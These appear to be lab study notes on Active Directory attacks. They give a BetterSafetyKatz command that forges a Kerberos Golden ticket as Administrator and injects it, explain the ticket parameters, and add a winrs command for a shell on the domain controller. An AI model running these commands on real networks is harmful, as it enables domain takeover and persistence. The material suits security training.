**Use BetterSafetyKatz.exe to create a Golden ticket:**
```
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /aes256:krbtht-aes /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```

/domain: - Domain FQDN (Fully Qualified Domain Name).
/sid: - SID of the domain.
/startoffset: - Optional when the ticket is available (default 0).
**Check in Domain Policy (PowerView):**
	/endin: - Optional ticket lifetime (default is 10 years) in minutes
	/renewmax: - Optional ticket lifetime with renewal (default is 10 years) in minutes

winrs -r:corp-dc cmd
